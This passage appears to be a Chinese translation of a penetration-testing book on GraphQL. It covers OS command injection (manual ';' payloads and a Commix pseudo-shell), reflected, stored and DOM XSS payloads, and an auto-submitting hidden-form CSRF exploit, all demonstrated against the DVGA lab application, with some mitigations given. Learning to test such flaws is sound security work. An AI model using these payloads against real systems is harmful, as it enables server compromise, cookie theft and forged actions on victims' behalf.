应用程序通常设计为使用系统 shell 库来执行后端任务。例如，应用程序可能需要使用 ping 命令检查远程服务器是否存活，或使用 wget 命令下载文件。它还可能使用 zip、tar 或 gunzip 等命令压缩文件，或使用 cp 或 rsync 等命令备份文件系统。

仅仅使用系统实用程序并不一定表明存在 OS 命令注入漏洞，但如果应用程序运行的系统实用程序命令可以受任意用户输入的影响，情况就会变得危险。在进行源代码审查时，请查找以下导入的库和函数，并查看其命令是否使用自定义用户输入构建：

- Python 库如 subprocess 和 os 以及 exec 和 eval 等函数
- PHP 函数如 system、shell_exec、eval 和 exec
- Java 函数如 Runtime.exec()
- Node.js 模块如 child_process 以及 exec 和 spawn 等函数

### 一个示例

假设一个应用程序允许用户提供一个 URL，然后将其下载到自己的文件系统中。考虑以下 Flask 中的函数作为示例，Flask 是一个用 Python 编写的 Web 框架：

```
@app.route('/download', methods=['POST'])
def download():
    ① url = request.form['url']
    ② os.system('wget {} -P /data/downloads'.format(url))
    return redirect('/dashboard')
```

此代码片段是一个 Python Web 应用程序路由，公开了一个名为 /download 的端点。此端点支持通过 HTTP POST 方法传入的请求。

在 ① 处，应用程序通过网站上的 HTML 表单获取用户输入并将其分配给 url 变量。在 ② 处，url 变量在 wget 命令的上下文中使用，从而有效地允许 wget 使用 url 变量下载文件。下载的文件随后存储在服务器文件系统的 /data/downloads 文件夹下。因此，如果客户端提供类似 http://example.com/file.zip 的 URL，Web 应用程序将执行以下 shell 命令：

```
wget http://example.com/file.zip -P /data/downloads
```

这里存在多个问题。首先，应用程序允许提供任何 URL。没有检查来验证输入是否 even 采用有效的 URL 格式。其次，客户端可以提供内部 URL 或私有 IP 地址，以识别和访问内部受限资源，这也可能导致服务器端请求伪造（SSRF）漏洞（有关 SSRF 漏洞的更多信息请参见第 9 章）。此外，由于应用程序将客户端输入直接插入到 wget 命令中，我们可以引入任何我们想要的 shell 命令。我们还可以使用分号（;）字符来中断或分隔 wget 命令并启动新命令，从而有效地执行 OS 命令注入。这可能导致服务器完全被攻破。

### DVGA 中的手动测试

在 GraphQL 中，如果解析器函数接受来自 GraphQL 字段的参数但未对输入实施必要的验证，则可能发生 OS 命令注入。让我们在 DVGA 中探索其外观。

回到我们之前审查的模式文档，我们有四个感兴趣的字段，它们都以 system 开头：systemUpdate、systemHealth、systemDiagnostics 和 systemDebug。虽然字段名称可能因应用程序而异，但 system 这个词通常暗示底层使用了系统 shell 命令，因此探索它们以查找 OS 命令注入是值得的。

如果你曾经对家用路由器进行过渗透测试，你会知道其调试或诊断页面可能是寻找影响重大的漏洞最有趣的地方。OS 命令注入通常存在于这些接口中，因为它们在底层使用 ping 或 traceroute 等网络实用程序。家用路由器并不以安全性著称；它们几乎从不检查危险字符的输入，并且通常容易受到 OS 命令注入的影响。

在本节中，我们将重点关注 systemDebug。在 Altair 中运行以下命令，看看我们得到的响应类型：

```
query {
  systemDebug
}
```

如果你做过一点 Linux 系统管理，你可能会认出以下输出片段；它来自 ps 命令，该命令显示有关正在运行的系统和用户进程的信息：

```
"systemDebug": "    PID TTY          TIME CMD\n 11999 pts/1    00:00:00 bash\n 14050 pts/1    00:00:00 python3\n 14055 pts/1    00:00:03 python3\n 14135 pts/1    00:00:00 sh\n 14136 pts/1    00:00:00 ps\n"
```

在 Altair 中打开 Docs 页面。在 Queries 下，你会注意到 systemDebug 接受一个名为 arg 的单个参数，其类型为 String，这看起来很有希望。GraphQL 查询解析器是否将此参数直接发送到 ps 命令？让我们来看看：

```
query {
  systemDebug(arg:"ef")
}
```





现在输出看起来有点不同。这是因为 e 和 f 是 ps 命令接受的两个有效参数，它们会改变输出的格式。e 参数会显示系统上的所有进程，而 f 会将输出格式更改为完整格式列表。

看起来 arg 参数会将我们的输入与 ps 命令连接起来。我们可以通过修改 arg 来尝试引入自己的命令，方法是添加分号字符（;），然后跟上我们选择的另一个 Linux 命令，例如 uptime：

```
query {
  systemDebug(arg:"; uptime")
}
```

现在我们得到了不同的输出。看起来它包含了来自 GraphQL 服务器的系统信息，证实了我们的假设，即操作系统命令注入是可能的：

```
PID TTY        TIME CMD\n 11999 pts/1    00:00:00 bash\n 14050 pts/1 1 user,  load average: 0.71, 0.84, 0.91\n"
```

接下来，我们将探讨如何通过利用专门的命令注入框架，更有效地测试操作系统命令注入。

## 使用 Commix 进行自动化测试

到目前为止，我们一直采用手动方法来识别操作系统命令注入漏洞。然而，有时这些漏洞并不会那么容易找到和利用。例如，一些应用程序可能会限制它们接受的字符类型，使得在诸如查询参数等位置注入命令变得更加困难。或者，目标 GraphQL API 与我们之间可能存在防火墙，阻止危险字符被接受。这些安全控制使得使用手动测试方法来识别漏洞变得困难，而手动测试方法耗时耗力。

自动化命令注入有助于测试许多字符变体，直到找到正确的逻辑。例如，命令注入可以通过引入以下字符中的任何一个来实现，其中包括：

- 分号（;）用于分隔命令
- 单个与号（&）将第一个命令发送到后台并继续执行我们引入的第二个命令
- 双与号（&&）在第一个命令成功完成（返回 true）后运行第二个命令，充当 AND 条件
- 双竖线（||）在第一个命令未成功完成（返回 false）后运行第二个命令，充当 OR 条件

通过使用自动化注入工具，我们可以用很少或没有的精力测试这些字符。

Commix 是一个跨平台的操作系统命令注入框架，能够在应用程序中查找和利用这些漏洞。Commix 通过模糊测试各种应用程序输入并检查服务器响应中指示成功注入的模式来实现其功能。Commix 还可以通过推断来识别成功的注入尝试，例如通过向命令添加延迟并通过使用 sleep 来计时响应。

让我们再回顾一下 GraphQL systemDebug 字段，该字段允许我们通过其 arg 参数注入操作系统命令。假设在渗透测试中，我们尚未及时确定如何利用应用程序，但认为那里可能有东西可供探索。我们可以使用 Commix 来扩展我们的攻击，通过尝试数十种有效负载变体并节省宝贵的时间。

列表 8-5 中的 Commix 命令展示了如何针对目标应用程序运行注入测试：

```
# commix --url="http://127.0.0.1:5013/graphql"
--data='{"query":"query{systemDebug(arg:\"test \")}"}' -p arg

[info] Testing connection to the target URL.
You have not declared cookie(s), while server wants to set its own.

Do you want to use those [Y/n] > Y
[info] Performing identification checks to the target URL.
Do you recognize the server’s operating system? [(W)indows/(U)nix/(q)uit] > U
JSON data found in POST data. Do you want to process it? [Y/n] > Y
It appears that the value 'query{systemDebug(arg:\"test\")}' has boundaries.
Do you want to inject inside? [Y/n] > Y

[info] Testing the (results-based) classic command injection technique.
[info] The POST (JSON) parameter 'arg' seems injectable via (results-based) classic command injection technique.
|_ echo UTKFLI$( (13+45))$(echo UTKFLI)UTKFLI

Do you want a Pseudo-Terminal shell? [Y/n] > Y
Pseudo-Terminal (type '?' for available options)

commix(os_shell) > ls

__pycache__ app.py config.py core db dvga.db pastes requirements.txt setup.py static templates version.py
```

列表 8-5：使用 Commix 进行成功的 GraphQL 操作系统命令注入

我们使用 GraphQL 查询 systemDebug 以及 arg 参数，通过使用 GraphQL 目标 URL http://localhost:5013/graphql 来指定 GraphQL 目标 URL。然后我们使用 -p 标志来指示 Commix 在特定的 arg 占位符处注入有效负载。

Commix 识别出服务器想要设置 HTTP cookie。我们通过在命令行输入 Y 来接受它。Commix 然后需要知道远程服务器运行的操作系统类型，以便它可以从其数据库中选择相关的有效负载。例如，Linux 服务器需要的注入有效负载与 Windows 服务器不同。我们通过指定字符 U 来选择 Unix 选项。

接下来，我们指示 Commix 处理来自 GraphQL 服务器的 JSON 响应。我们指定我们想要在命令边界内注入有效负载。Commix 信号显示它发现 arg 参数是可注入的。它通过将 echo 命令插入其中以及一个唯一的字符串来识别这一点。如果响应包含此唯一字符串，则意味着代码已成功注入。

我们在其中生成一个伪终端 shell，以便向服务器发送 Unix 命令。最后，我们发送 ls 命令来测试我们是否可以使用我们的 shell 与服务器交互并列出其文件。我们可以看到列出了一些文件，这意味着我们已成功执行了操作系统命令注入。

正如你所见，Commix 提供了针对 GraphQL API 运行一系列注入测试的非常方便的方法。

## 解析器函数的代码审查

让我们审查一下 systemDebug 的解析器函数在 DVGA 中的实现方式（列表 8-6）。这应该有助于我们更好地理解我们发现的操作系统命令注入漏洞的根本原因。

```
def resolve_system_debug(self, info, arg=None):
    Audit.create_audit_entry(info)
    if arg:
        output = helpers.run_cmd('ps {} '.format(arg))
    else:
        output = helpers.run_cmd('ps')
    return output
```

列表 8-6：DVGA 中的解析器函数

resolve_system_debug() Python 函数处理 GraphQL 字段 systemDebug。它接受一个名为 arg 的单个可选参数。如果客户端在查询中未设置参数，则默认值为 None。

在此函数内部，helpers.run_cmd() 函数运行 ps 系统 shell 命令，如果 arg 不为 None，则将其与 arg 值连接。如果客户端提供参数 ef，则命令 effectively 变为以下内容：

```
output = helpers.run_cmd('ps ef')
```

如果客户端未向 arg 参数提供任何值，则该函数仅自行运行命令 ps，返回系统上正在运行的进程列表。

这里的漏洞在于，对提供的参数 arg 没有任何安全检查，因此解析器函数将执行它收到的任何 Linux 命令。这可以通过多种方式缓解：

- 仅接受字母字符（a 到 z）并确保这些是有效的 ps 参数
- 删除任何可能允许攻击者引入额外命令的危险字符
- 以无特权用户身份运行命令，以减少注入可能发生时的风险
- 使用专用内置库而不是直接使用 shell 命令，例如 Python 中的 `psutil` 库

> NOTE
> 网站 GTFOBins（https://gtfobins.github.io）在执行操作系统命令注入时是一个有用的资源。如果您可以通过 GraphQL API 部分或完全控制一个二进制文件，您可以在 GTFOBins 数据库中查找二进制文件的名称，以了解它如何被滥用以突破 shell 或提升权限。

到目前为止，我们讨论了当存在时会影响服务器的注入漏洞。接下来，我们将探讨一些会影响客户端的注入漏洞。

## 跨站脚本

注入漏洞也会影响客户端。想象一下社交媒体网站上的个人资料更新页面，允许用户更改他们的全名和个人简介。如果应用程序不对此输入执行任何安全验证，我们就可以尝试使用一些 GraphQL 突变来提交恶意 JavaScript 代码到页面，并在其他客户端访问我们的个人资料时在页面上呈现。能够在客户端浏览器上执行 JavaScript 非常强大，因为它允许我们将浏览器信息（例如 cookie）外泄到远程服务器并获得可以劫持客户端会话的敏感会话令牌。

跨站脚本（XSS）漏洞发生在客户端代码（例如 JavaScript）在网络浏览器的上下文中被解释和执行时。这种类型的漏洞自 1990 年代就已报告，但 30 多年后我们仍然看到它。

如果你已经熟悉 XSS 漏洞，你会发现它们在 GraphQL 中与 REST 等其他 API 技术并没有太大不同。本节简要解释了 XSS 漏洞的主要类型：反射型、存储型和基于 DOM 的。然后我们将探索 DVGA 中的 XSS 漏洞，以便你可以在 GraphQL API 中获得识别它们的经验。

### 反射型 XSS

也许是所有 XSS 漏洞中最简单的，反射型 XSS 发生在输入提交到服务器并在立即响应中返回给客户端时，例如在 HTML 错误消息中或在 HTML 页面内容中。

从攻击者角度来看，利用反射型 XSS 漏洞需要通过社会工程手段诱使受害者点击触发 XSS 有效负载的链接，导致攻击者的 JavaScript 代码在受害者的浏览器中运行。





在 GraphQL 的上下文中，一个容易受到反射型 XSS 攻击的查询可能看起来如下：

```
query {
  hello(msg:"Black Hat GraphQL")
}
```

这个 hello 操作接收一个 msg 参数，该参数接受来自客户端的输入——在本例中为字符串 Black Hat GraphQL。当客户端提交此信息时，服务器将渲染页面并可能打印类似 Hello Black Hat GraphQL! 的消息。

现在，假设我们将 msg 参数值更改为 JavaScript 有效载荷：

```
query {
  hello(msg:"<script>document.cookie;</script>")
}
```

当这在客户端浏览器中被渲染时，<script> 标签将指示浏览器调用 document JavaScript 对象并打印 cookie 字符串。Cookie 通常包含与会话相关的信息，例如标识符。

由于此信息并未存储在服务器的任何数据库中，而是作为对查询的响应反射回客户端，因此 XSS 属于反射类型。我们可以通过让受害者的浏览器将其 cookie 发送到我们控制的远程服务器来改进有效载荷，从而允许我们窃取用户的 cookie。

我们之前提到过，此攻击需要社会工程才能发挥作用。例如，通过钓鱼邮件，我们可以向受害者发送包含我们恶意 JavaScript 有效载荷的 URL，然后等待他们点击它。

你可能会问自己，使用 POST 请求时这会如何工作？嗯，书中前面提到过 GraphQL 可能支持基于 GET 的查询，因此你可以尝试构造如下链接并测试目标 GraphQL 服务器是否支持基于 GET 的查询：

```
http://example.com/graphql?query=query%20%7B%0A%20%20hello(msg%3A%22hello%22)%0A%7D
```

该 URL 解码后如下所示：

```
http://example.com/graphql?query=query {
  hello(msg:"hello")
}
```

支持基于 GET 查询的 GraphQL API 将接受一个 query GET 参数，后跟查询语法。查询操作可以是查询或变更。受害者点击此链接时将使用 GET 请求提交 GraphQL 查询。在第 9 章中，你将了解基于 GET 的查询如何也被利用来执行跨站请求伪造（CSRF）攻击。

## 存储型 XSS

在存储型或持久型 XSS 中，注入的有效载荷会被持久化到数据存储中，例如数据库，而不是作为对查询的响应反射回客户端。因此，与反射型 XSS 不同，存储型 XSS 漏洞会在客户端浏览器每次加载包含恶意有效载荷的页面时触发注入的脚本。

通常，存储型 XSS 漏洞被认为比反射型 XSS 更危险。XSS 有效载荷存在于应用程序的数据存储中可能会对其他系统构成风险，例如以下情况：

- 其他从与 GraphQL 应用程序相同的数据库读取恶意输入的服务器。这些服务器实际上会受到相同的漏洞利用影响。
- 同一 GraphQL 应用程序中从同一数据存储读取的其他流程。漏洞利用会影响应用程序的其他部分，从而影响其他客户端。

图 8-11 显示了存储型 XSS 如何影响其他系统。

![](img/2f244b00cd9f8f37cfc22f928aaa471a_238_0.png)

图 8-11：存储型 XSS 漏洞影响相邻应用程序

我们的恶意输入可能会遍历网络上的许多设备和资源；在首次命中 GraphQL API 层后，它可能会被插入到不同的数据存储中，例如缓存数据库、关系数据库或本地文件。

从那里，我们不总是知道漏洞利用尝试是否成功。通常我们需要等待某物（或某人）触发我们的有效载荷。想象一下，我们使用 GraphQL 变更发送 JavaScript 有效载荷，然后没有收到任何表明它已被应用程序作为 JavaScript 代码成功渲染的指示。有多种解释是可能的。例如，我们可能已将有效载荷注入到仅由具有不同访问级别的应用程序用户读取的数据库表中。

联系表单提供了一个很好的例子。假设你向最近购买商品的商店的反馈表单中提交了一个有效载荷并

收到 Thank you for your submission 消息。即使你没有收到漏洞利用尝试成功的任何指示，你的攻击也不一定是死路一条。有效载荷可能只有在商店打开反馈表单后才会触发。这可能发生在几天甚至几周后。我们称这些隐藏攻击为盲 XSS，是存储型 XSS 的一个子类别。

为了利用盲 XSS 漏洞，你可以使用生成唯一有效载荷进行测试的工具。当发现 XSS 漏洞并且有效载荷被触发时，有效载荷将向中央服务器发送探测以供进一步检查，从而允许你捕获有效载荷执行客户端的信息。其中一种工具是 XSS Hunter（https://xss-hunter.com）。在你的 XSS 有效载荷触发时通知你的工具非常方便。

## 基于 DOM 的 XSS

文档对象模型-based XSS，或 DOM-based，漏洞发生在 JavaScript 注入有效载荷仅在浏览器 DOM 内执行时。DOM 是网页文档的表示形式，允许应用程序修改其结构、内容和样式。所有 HTML 对象都可以使用 DOM API 进行操作。

例如，document 对象可用于获取网页中的 HTML <title> 标签。在 DVGA 的 Web 界面中，打开浏览器的开发者工具并在 Console 选项卡中输入命令 document.title。你应该会看到以下结果：

```
# document.title

'Damn Vulnerable GraphQL Application'
```

虽然反射型 XSS 和存储型 XSS 源于服务器端代码中的漏洞，但 DOM XSS 漏洞通常源于面向客户端的前端应用程序代码中的漏洞。例如，当恶意输入可以被插入（通常作为 URL 的一部分）并传递给支持动态代码执行的组件时就会发生这种情况，例如 JavaScript 的 eval 函数。

由于 DOM XSS 漏洞发生在客户端代码中，GraphQL API 并不是此类漏洞的根本原因。尽管如此，我们认为了解它们很重要，因为社区构建的 GraphQL 客户端可能容易受到此类漏洞的影响。有关可用的 GraphQL 客户端库的完整列表，请访问 https://graphql.org/code/#javascript-client。

## 在 DVGA 中测试 XSS

在本节中，我们将使用 DVGA 的用户界面执行 XSS 测试。DVGA 中实现了大量 XSS 漏洞，因此我们可以通过多种方式实现 XSS。我们将探索一些技术，让你熟悉使用 GraphQL 查询进行 XSS 测试。

### NOTE
本节要求你将 JavaScript 有效载荷插入 DVGA，这可能会干扰其 Web 界面。别担心；有一切恢复的方法。通过点击用户图标然后选择 Rollback DVGA 将 DVGA 恢复到最后一次已知良好状态。这将重建数据库并重新加载应用程序。或者，你可以拍摄虚拟机快照并在需要时恢复它。

在实验室中打开你的 Web 浏览器并导航到 DVGA 的主界面 http://localhost:5013。

## 篡改审计页面

作为第一步，点击左侧边栏上的一些页面，例如 Public Pastes。你的浏览器将开始发送 GraphQL 查询以用信息填充网页。接下来，点击右上角的用户图标；然后点击 Audit。你应该能够看到列出的审计事件，如图 8-12 所示。

![](img/2f244b00cd9f8f37cfc22f928aaa471a_240_0.png)

图 8-12：DVGA 中的审计跟踪

此 Audit 页面表明应用程序正在自动跟踪我们在浏览页面时浏览器发送的每个查询，收集以下信息等：

- 行为者或用户名称（在本例中为 DVGAUser）
- 使用的 GraphQL 操作名称（在本例中为 getPastes）
- 执行的查询（在本例中为使用 public 参数的 pastes GraphQL 字段以及一些选定字段，例如 id、title 和 content）

此输入完全在我们控制之下。让我们首先探索如何篡改 GraphQL 操作以影响 Audit 页面。将以下查询复制并粘贴到 Altair 中并运行它：

```
mutation SpoofedOperationName {
  createPaste(title:"Black Hat GraphQL", content:"I just spoofed the operation name.") {
    paste {
```





该 mutation 创建了一个标题为 Black Hat GraphQL 且内容为我刚刚伪造的操作名的新 paste。同时，我们返回了新创建的 paste 的 content 和 title 字段，其值应完全相同。

刷新 Audit 页面。你应该能看到它现在在 GraphQL Operation 列下显示了我们伪造的操作名 SpoofedOperationName，如图 8-13 所示。这就是安全分析人员在尝试使用操作名监控 GraphQL 查询时可能会看到的情况。

![](img/2f244b00cd9f8f37cfc22f928aaa471a_241_0.png)

图 8-13：Audit 页面显示 DVGA 中被修改的操作名

正如我们之前提到的，不同的 GraphQL 服务器实现可能允许操作名包含特殊字符，这可能成为注入向量，因此在可能的情况下务必始终测试这些情况。

## 在 CreatePaste Mutation 中寻找存储型 XSS

当我们在 DVGA 中创建新 paste 时，用于 createPaste mutation 的 GraphQL 字段，例如 title 和 content，会显示在 Public Pastes 页面上。图 8-14 中的截图显示了它看起来像什么。

![](img/2f244b00cd9f8f37cfc22f928aaa471a_241_1.png)

图 8-14：DVGA 中 paste 的结构和内容

正如你所见，我们的 paste 显示在网页上。这是一个很好的机会，可以开始使用诸如 JavaScript 代码之类的输入测试 createPaste 字段，以查看数据是否在 Web 界面中安全渲染。

继续使用第 8-7 节中所示的 mutation 查询创建一个新的 paste。

```
mutation {
  createPaste(title:"XSS", content:"<script>alert(\"XSS\")</script>") {
    paste {
      title
      content
    }
  }
}
```

清单 8-7：使用 createPaste mutation 注入 XSS 有效载荷

此 mutation 创建了一个新的 paste，其中 content 参数包含 JavaScript <script> 标签。如果应用程序容易受到 XSS 攻击，此代码将在浏览器中渲染，并弹出一个带有消息 XSS 的 alert 消息框。发送此 mutation 查询后，前往 Public Pastes 页面。你应该会收到弹出消息，如图 8-15 所示。

![](img/2f244b00cd9f8f37cfc22f928aaa471a_242_0.png)

图 8-15：通过恶意 mutation 触发的 XSS 有效载荷

让我们回顾一下这里发生了什么。我们首先使用 createPaste 创建了一个新的 paste，将恶意的 JavaScript 有效载荷提供给 mutation 的 content 参数。然后 API 将新 paste 存储在数据库中。因为我们的客户端正在使用 WebSocket 协议上的 GraphQL subscription 操作，并且订阅是实时的，所以我们立即看到我们创建的新 paste，其中包含恶意的 JavaScript 代码。这是一个存储型 XSS 漏洞的示例。

## 在文件上传功能中寻找反射型 XSS

现在我们将探索使用文件上传功能创建新 paste。这应该能让你了解 GraphQL 中的文件上传看起来如何，以及它们是否可能容易受到 XSS 攻击。将以下文本文件下载到你的计算机：https://github.com/dolevf/Black-Hat-GraphQL/blob/master/ch08/paste_from_file.txt。

在 DVGA 中打开 Upload Paste 页面以上传文本文件。此文件最终将被存储在数据库中。点击 Choose File 并选择你下载的文件；然后点击 Upload。

你可以使用 Burp Suite 在点击 Upload 按钮之前拦截请求，以查看 GraphQL mutation 的样子。或者使用浏览器开发者工具中的 Network 选项卡。图 8-16 显示了 Burp Suite 中的 mutation。

```
POST /graphql HTTP/1.1
Host: 127.0.0.1:5013
Content-Length: 360
sec-ch-ua: "Not/A Brand";v="8", "Chromium";v="102"
Accept: application/json
Content-Type: application/json
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36
sec-ch-ua-platform: "Linux"
Origin: http://127.0.0.1:5013
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://127.0.0.1:5013/upload_paste
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: ev-graphql: disable
Connection: close

{
  "query": "mutation UploadPaste ($filename: String!, $content: String!) {\n    uploadPaste(filename: $filename, content:$content)\n  }\n",
  "variables": {
    "content":"<h3>Uploaded Paste</h3><p>This is an example paste from a file.</p>\n<script>alert(\"Black Hat GraphQL\")</script>\n",
    "filename":"file.txt"
  }
}
```

图 8-16：Burp Suite 中的 UploadPaste mutation

正如你所见，我们正在使用 UploadPaste 使用本地文件创建一个新 paste。你还可以看到我们作为 HTTP POST JSON 有效载荷的一部分传递了两个变量，content 和 filename。content 键包含上传文件中存在的数据，而 filename 键是服务器将在磁盘上设置的文件名。

有效载荷定义了 HTML 标题（<h3>）、段落（<p>）和调用 alert 函数并使用字符串 Black Hat GraphQL 的 JavaScript script 标签（<script>）。此信息将被浏览器渲染，并且由于使用了 alert，一个弹出窗口将出现，确认我们能够通过 XSS 注入运行 JavaScript。

在将此查询发送到服务器后（确保在 Burp Suite 中点击 Forward 来执行此操作），我们可以通过导航到 Private Pastes 页面来查看新上传的文件。你应该能够看到 JavaScript 弹出窗口，如图 8-17 所示。

![](img/2f244b00cd9f8f37cfc22f928aaa471a_244_0.png)

图 8-17：paste 代码在浏览器中执行并触发 alert 窗口。

我们能够通过使用 UploadPaste 上传包含 JavaScript 和 HTML 代码的恶意文本文件来触发存储型 XSS 漏洞。

## 总结

在本章中，我们仔细研究了注入漏洞，从影响数据库和操作系统的漏洞到影响客户端浏览器的漏洞，包括经典和盲 SQLi；反射型、存储型和 DOM-based XSS；以及 OS 命令注入。

当 GraphQL API 未能仔细验证输入时，可能会出现许多问题。我们确定了 GraphQL 中的各种输入入口点——从查询、字段和指令参数到操作名——所有这些都构成了注入攻击面。注入漏洞可能对应用程序数据造成毁灭性影响，虽然框架通过提供可重用的安全方法变得更好地保护它们，但它们至今仍然普遍存在。

## 9

## 请求伪造和劫持

![](img/2f244b00cd9f8f37cfc22f928aaa471a_246_0.png)

当攻击者对服务器和客户端执行劫持和伪造攻击时，他们可以执行具有潜在毁灭性后果的敏感操作。在本章中，我们将测试这些漏洞并了解应用程序可能实施的防御措施，以减轻此类缺陷。

*请求伪造* 发生在攻击者能够代表客户端或服务器执行操作时，最好是敏感操作。当攻击者针对客户端时，他们可能会例如试图强制客户端将资金转移到他们控制的数字钱包或银行账户。当攻击者针对服务器时，他们可能反而旨在获取敏感的服务器端数据、探测隐藏或内部服务、向受限网络发出内部请求、访问与云环境相关信息等。相比之下，*劫持* 指的是窃取另一用户的会话的能力。

在 GraphQL 的上下文中，每种攻击向量都构成了威胁。我们将讨论这些攻击可以采取的三种形式：跨站请求伪造（CSRF）、服务器端请求伪造（SSRF）和跨站 WebSocket 劫持（CSWSH）。

## 跨站请求伪造

通常读作 sea-surf，CSRF 是一种客户端攻击，导致受害者在他们已通过身份验证的网站上执行不需要的操作。在此类攻击中，攻击者编写代码并将其嵌入他们运营的网站（有时在允许他们这样做的第三方网站中）。然后他们通过利用社会工程等攻击迫使受害者访问该网站。当代码在受害者浏览器中执行时，它会伪造并向服务器发送请求。

更常见的是，这些请求执行状态更改操作。它们可能会更新账户的电子邮件或密码，从一个账户向另一个账户转账，禁用账户安全设置如多因素身份验证，授予权限，甚至向应用程序添加新账户。图 9-1 举例说明了典型的 CSRF 攻击流程，以银行网站为例。

![](img/2f244b00cd9f8f37cfc22f928aaa471a_247_0.png)

图 9-1：CSRF 攻击的流程

CSRF 利用了这样一个事实：当客户端登录到应用程序时，浏览器会在其发出的每个 HTTP 请求中向站点发送必要的信息，例如会话 cookie（在 Cookie 头中），以及 Host 或 User-Agent 等标准头。Web 服务器无法区分合法请求和由用户


被欺骗，这就是为什么在没有缓解措施防止它们的情况下 CSRF 攻击会很有效。

攻击者使用多种技术来实现 CSRF，但一个常见策略依赖于使用 <form> 标签创建的特殊 HTML 表单。攻击者等待用户在其网站上提交表单，或者为了提高成功率，使用 JavaScript 代码自动执行。当条件允许攻击者使用 GET 方法执行 CSRF 攻击时，他们还可能使用 <a> 和 <img> 等 HTML 标签作为载体。这些通常不被认为有害的标签，可以为攻击者提供在允许插入图像链接和超链接的网站中嵌入 CSRF 有效载荷的选项。这些标签只能发出纯 GET 请求，因此如果网站已实施反 CSRF 令牌，攻击可能不会成功。

> NOTE
> HTML 表单只能使用 HTTP 方法 GET 和 POST。其他潜在的改变状态的方法，例如 DELETE 或 PUT，不受支持。

由于 CSRF 攻击依赖于受害者的已认证会话，攻击者只能执行受害者在网站上被允许执行的操作。例如，如果受害者登录了银行网站但每天只能转账 $1,000，CSRF 攻击将仅限于转账该金额。此外，如果某个请求需要客户端会话没有的管理员级权限，该请求将失败。第 7 章提供了绕过某些 GraphQL 授权控制的技术。

CSRF 至少已有二十年历史。我们能找到的第一个带有分配 CVE 标识符的 CSRF 相关漏洞 CVE-2002-1648 是 2002 年的，尽管有些人认为 CSRF 漏洞可能早在 2001 年就已存在。对于 GraphQL 来说，开发人员可能会使用查询或变更来构建支持执行敏感操作（例如更改账户设置或从一个账户向另一个账户转账）的模式。这可能允许攻击者执行改变状态的操作。正如你所学到的，改变状态的操作通常使用变更来完成。然而，开发人员可能会选择使用查询来实现这些操作。

## 定位改变状态的操作

改变状态的操作会以某种方式改变应用程序。例如，将 DVGA 的模式从 Beginner 更改为 Expert，或反之亦然，被视为改变状态的操作。如果你正在寻找 CSRF，你应该针对这些操作。正如你现在所知，GraphQL 中的改变状态操作通常使用变更来执行。然而，你有时可以通过使用 GraphQL 查询来执行改变状态的写入操作。

让我们从更可能的场景开始：基于变更识别改变状态的操作。为了找到有影响力的 CSRF 漏洞，尝试提取可用变更的列表并搜索那些能让你在应用程序中获得立足点或允许你提升现有权限的变更。清单 9-1 中显示的 introspection 查询应返回模式中存在的变更字段。

```
query {
  __schema {
    mutationType {
      fields {
        name
      }
    }
  }
}
```

Listing 9-1: Introspection query to extract mutation field names

继续使用 Altair 运行此查询针对 DVGA，确保 DVGA 的模式设置为 Beginner。你应该能识别出一些改变状态的操作，例如 createUser、importPaste、editPaste、uploadPaste、deletePaste 和 createPaste。

在你没有注意到任何敏感操作的情况下，下一步要寻找的是你是否可以使用查询来执行改变状态的操作。GraphQL 服务器有时支持通过 GET 进行操作，并且当它们这样做时，它们可能会有意拒绝基于 GET 的变更以仅允许使用 GET 进行读取操作。这在一定程度上提供了防止 CSRF 类漏洞的保护，正如本章后面将学习的那样。然而，如果我们的目标使用任何基于 GET 的查询来执行重要的状态更改，则该缓解措施就无用了。执行清单 9-2 中显示的 introspection 查询以获取可用查询的名称。

```
query {
  __schema {
    queryType {
      fields {
        name
      }
    }
  }
}
```

Listing 9-2: Introspection query to extract query field names

以下是返回列表的摘录：

```
{
  "name": "search"
},
{
  "name": "audits"
},
{
  "name": "deleteAllPastes"
}
--snip--
```

是否有任何查询名称引起注意？该列表有几个潜在的改变状态查询，但 deleteAllPastes 特别有趣。删除所有粘贴的查询更适合作为变更而不是查询。然而，由于此应用程序存在漏洞，它没有考虑 CSRF 问题。

## 测试基于 POST 的漏洞

现在我们已经识别出一些改变状态的查询和变更，我们可以尝试制作一个利用它们的 HTML 表单。我们的攻击可能会诱骗用户点击一个链接，将他们重定向到包含类似清单 9-3 的表单的恶意网站。提交后，它将使用 createPaste 变更向 DVGA 发出 POST 请求。

```
<html>
<h1>Click the button below to see the proof of concept!</h1>
<body>
    <form id="auto_submit_form" method="POST" action="http://localhost:5013/graphql">
        <input type="hidden" name="query" value="mutation { createPaste(title:&quot;CSRF&quot;, content:&quot;content&quot;; public:true, burn: false) { paste { id content title burn } }}"/>
        <input type="submit" value="Submit">
    </form>
</body>
<html>
```

Listing 9-3: HTML-form POST-based CSRF exploit

我们使用 method 属性定义一个名为 query 的基于 POST 的表单。此表单将向在 action 属性中定义 DVGA 的 URL 发出请求。你会注意到我们还通过将 type 属性设置为 hidden 定义了一个隐藏的 <input> 标签。这确保了用于执行查询的表单对受害者保持不可见；它不会显示在其浏览器中。我们在 value 属性中编码并定义 GraphQL 变更。变更的解码版本如下所示：

```
mutation {
    createPaste(title: "CSRF", content: "content", public: true, burn: false) {
        paste {
            id
            content
            title
            burn
        }
    }
}
```

要观察此表单在攻击中如何工作，请从书籍的 GitHub 仓库 https://github.com/dolevf/Black-Hat-GraphQL/blob/master/ch09/post_csrf_submit.html 下载 CSRF 概念验证代码。将此文件保存到 Kali 的桌面，扩展名为 .html。

接下来，让我们使用 Burp Suite 查看 CSRF 攻击中发送的传出请求。启动 Burp Suite 并通过点击 Open Browser 打开其内置浏览器。确保它当前设置为不拦截请求。然后，将 HTML 文件从桌面拖放到浏览器窗口中。你应该会看到图 9-2 中显示的 Submit 按钮。

![](img/2f244b00cd9f8f37cfc22f928aaa471a_251_0.png)

Figure 9-2: A POST-based CSRF example

在 Burp 中，将 Intercept 按钮切换为 Intercept Is On。现在，点击表单中的 Submit 并观察 Burp 的 Proxy 选项卡中产生的请求。它应该类似于图 9-3。

![](img/2f244b00cd9f8f37cfc22f928aaa471a_251_1.png)

Figure 9-3: The POST request sent from a victim’s browser after a CSRF attack

